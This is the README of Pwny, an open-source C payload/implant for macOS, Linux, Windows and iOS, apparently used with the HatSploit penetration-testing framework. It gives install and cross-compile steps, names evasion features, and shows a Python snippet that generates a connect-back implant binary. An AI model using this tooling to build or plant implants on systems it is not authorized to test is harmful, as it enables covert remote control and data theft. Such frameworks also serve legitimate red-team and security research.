
<h3 align="left">
    <img src="docs/logo.png" alt="logo" width="45%" height="45%">
    <img width="45%" src="docs/demo.svg">
</h3>

*Friendly like a Pony, Mighty like a Knight*

[![Developer](https://img.shields.io/badge/developer-EntySec-blue.svg)](https://entysec.com)
[![Language](https://img.shields.io/badge/language-C-grey.svg)](https://github.com/EntySec/Pwny)
[![Language](https://img.shields.io/badge/language-Python-blue.svg)](https://github.com/EntySec/Pwny)
[![Forks](https://img.shields.io/github/forks/EntySec/Pwny?style=flat&color=green)](https://github.com/EntySec/Pwny/forks)
[![Stars](https://img.shields.io/github/stars/EntySec/Pwny?style=flat&color=yellow)](https://github.com/EntySec/Pwny/stargazers)
[![CodeFactor](https://www.codefactor.io/repository/github/EntySec/Pwny/badge)](https://www.codefactor.io/repository/github/EntySec/Pwny)

Pwny is an implementation of an advanced payload written in pure C and designed for portability and extensibility.

This repository contains Pwny, which is supposed to work on *macOS*, *Linux*, *Windows* and *iOS*, but can be ported to almost every POSIX system. Pwny is optimized to work with or without [HatSploit Framework](https://github.com/EntySec/HatSploit).

## Features

* Portable C code that can be compiled for a big range of targets.
* Support for *macOS*, *Linux*, *Windows* and *iOS* targets.
* Small executable with low resource utilization optimized for embedded systems.
* Dynamically-extendable, supports loading plugins (TABs) which extend its functionality.
* Evasion techniques such as process migration and in-memory loading.

## Installing

To install Pwny you simply need to install [HatSploit Framework](https://github.com/EntySec/HatSploit) and this will make Pwny available automatically.

```
pip3 install git+https://github.com/EntySec/HatSploit
```

## Building

**Building dependencies:**

```
make TARGET=<target>
```

**NOTE:** For *macOS / iOS* targets you are required to set `SDK` to the desired SDK path before running `make`. For example:

```
make TARGET=<target> SDK=<path>
```

You can find list of supported `TARGET` values for different platforms.

<details>
    <summary>Linux</summary><br>
    <code>aarch64-linux-musl</code><br>
    <code>armv5l-linux-musleabi</code><br>
    <code>armv5b-linux-musleabi</code><br>
    <code>i486-linux-musl</code><br>
    <code>x86_64-linux-musl</code><br>
    <code>powerpc-linux-muslsf</code><br>
    <code>powerpc64le-linux-musl</code><br>
    <code>mips-linux-muslsf</code><br>
    <code>mipsel-linux-muslsf</code><br>
    <code>mips64-linux-musl</code><br>
    <code>s390x-linux-musl</code><br>
    <br>
</details>

<details>
    <summary>Windows</summary><br>
    <code>x86_64-w64-mingw32</code><br>
    <code>x86_64-w64-mingw32</code><br>
    <br>
</details>

<details>
    <summary>macOS / iOS</summary><br>
    <code>arm-iphone-darwin</code><br>
    <code>aarch64-iphone-darwin</code><br>
    <code>i386-apple-darwin</code><br>
    <code>x86_64-apple-darwin</code><br>
    <code>aarch64-apple-darwin</code><br>
    <br>
</details>

**Building sources:**

```shell
cmake -DCMAKE_TOOLCHAIN_FILE=<toolchain> -B build
cmake --build build
```

**NOTE:** For *macOS / iOS* targets you are required to set `CMAKE_OSX_SYSROOT` to the desired SDK path with `-D`. For example:

```shell
cmake -DCMAKE_TOOLCHAIN_FILE=<toolchain> -DCMAKE_OSX_SYSROOT=<path> -B build
```

**NOTE:** Toolchains are located at `toolchain/cmake/`.

These are other `cmake` build options:

* `MAIN` - Should be `ON` if you want to build a source file to executable.
* `SOURCE` - Custom executable source file (default are in `src/main/`).
* `DEBUG` - Should be `ON` if you want to build Pwny in debug mode.
* `BUNDLE` - Build as bundle (macOS specific flag, adds `-bundle`)
* `SHARED` - Build shared object instead.

## Basic usage

To use Pwny and build payloads you should import it to your source.

```python3
from pwny import Pwny
from pwny.session import PwnySession
```

* `Pwny` - Pwny object that is used to generate payload implant.

```python3
pwny = Pwny(
    target='aarch64-apple-darwin',
    options={
        'uri': 'tcp://127.0.0.1:8888'
    }
)

with open('payload.exe', 'wb') as f:
    f.write(pwny.to_binary())
```

* `PwnySession` - Wrapper for `HatSploitSession` for Pwny, HatSploit should use it with Pwny payload. It might also be used without HatSploit as demonstrated in `examples/listener.py`.

## Projects

* [SeaShell Framework](https://github.com/EntySec/SeaShell) - iOS post-exploitation framework that enables you to access the device remotely, control it and extract sensitive information. SeaShell actively uses Pwny implant to communicate with iOS.

## Caveats

The code provided in this repository has not yet been prepared for use in a production environment. It can be improved, so any contribution is welcome. You can even experience memory leaks, so we'll be glad to accept every single PR which is fixing a potential issue.
